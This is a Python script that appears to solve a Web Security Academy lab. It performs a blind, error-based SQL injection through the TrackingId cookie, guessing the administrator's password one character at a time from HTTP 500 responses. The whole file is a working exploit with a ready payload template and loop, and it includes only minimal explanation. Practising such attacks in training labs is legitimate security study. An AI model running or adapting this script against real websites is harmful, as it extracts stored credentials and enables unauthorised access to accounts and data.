#!/bin/python3
import string
from urllib import request
import urllib.parse

import requests

REMOTE_URL = 'https://0a6a0022045a4842c02913e600860081.web-security-academy.net'
USERNAME = 'administrator'
PASSWORD_LENGTH = 30

COOKIE_TRACK_ID = 'xGigjfeFn6yqp2y5'
COOKIE_SESSION_ID = 'GZQ4qCi7UpyiNxKY73qFInQ1IhT54L5S'
PAYLOAD  = """
    ' AND (SELECT CASE WHEN SUBSTR(password, {pos}, 1) = '{char}' THEN TO_CHAR(1/0) ELSE '0' END FROM users WHERE username = '{username}') = '0
""".strip()

def main():
    password = ''
    session = requests.Session()
    
    counter = 1
    print("Trying to guess the password", end = ' ', flush = True)

    while counter <= 30:
        keep_running = False

        for char in string.printable:
            print('.', end = '', flush = True)

            if char in ['\n', '\r', '\t', '\f', '\v', '\'']:
                continue

            if char in ['+', ';']:
                char = urllib.parse.quote(char)
            
            injection = PAYLOAD.format(pos = counter, char = char, username = USERNAME)
            
            cookies = {
                'TrackingId': f'{COOKIE_TRACK_ID}{injection}',
                'session': COOKIE_SESSION_ID
            }

            response = session.get(url = REMOTE_URL, cookies = cookies)
            
            if response.status_code == 500:
                password += char
                keep_running = True
                print(f'[{char}]', end = '', flush = True)
                break

        if not keep_running:
            break

        counter += 1

    print(f'The password should be: [{password}]')

if __name__ == "__main__":
    main()

